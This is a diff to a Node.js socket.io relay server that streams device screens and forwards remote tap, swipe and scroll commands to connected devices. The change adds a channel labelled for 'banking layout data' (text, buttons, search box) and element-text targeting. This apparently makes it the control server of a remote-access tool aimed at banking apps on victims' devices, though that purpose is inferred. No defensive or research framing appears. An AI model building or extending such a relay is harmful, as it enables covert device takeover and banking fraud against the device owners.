@@ -50,7 +50,7 @@ io.on('connection', (socket) => {
         }
     });
 
-    // 🔥 FIXED: Screen streaming with proper room handling
+    // 🔥 SCREEN + LAYOUT STREAMING
     socket.on('screen-frame', (data) => {
         const deviceId = data.deviceId;
         if (devices.has(deviceId) && devices.get(deviceId).connected) {
@@ -64,9 +64,17 @@ io.on('connection', (socket) => {
         }
     });
 
-    // 🔥 PERFECT Control relay (tap, swipe, scroll)
+    // 🔥 BANKING LAYOUT DATA (TEXT + BUTTONS + SEARCHBOX)
+    socket.on('ui-layout', (data) => {
+        const deviceId = data.deviceId;
+        if (devices.has(deviceId) && devices.get(deviceId).connected) {
+            socket.to(deviceId).emit('ui-layout-update', data);
+        }
+    });
+
+    // 🔥 CONTROL COMMANDS
     socket.on('control', (data) => {
-        const { deviceId, action, x, y, startX, startY, endX, endY, scrollDistance } = data;
+        const { deviceId, action, x, y, startX, startY, endX, endY, scrollDistance, elementText } = data;
         if (devices.has(deviceId) && devices.get(deviceId).connected) {
             socket.to(deviceId).emit('control', {
                 action,
@@ -76,9 +84,10 @@ io.on('connection', (socket) => {
                 startY: parseFloat(startY) || 0,
                 endX: parseFloat(endX) || 0,
                 endY: parseFloat(endY) || 0,
-                scrollDistance: parseFloat(scrollDistance) || 0
+                scrollDistance: parseFloat(scrollDistance) || 0,
+                elementText: elementText || ""
             });
-            console.log('🎮 Control:', action, '→', deviceId);
+            console.log('🎮 Control:', action, '→', deviceId, elementText || '');
         }
     });
 
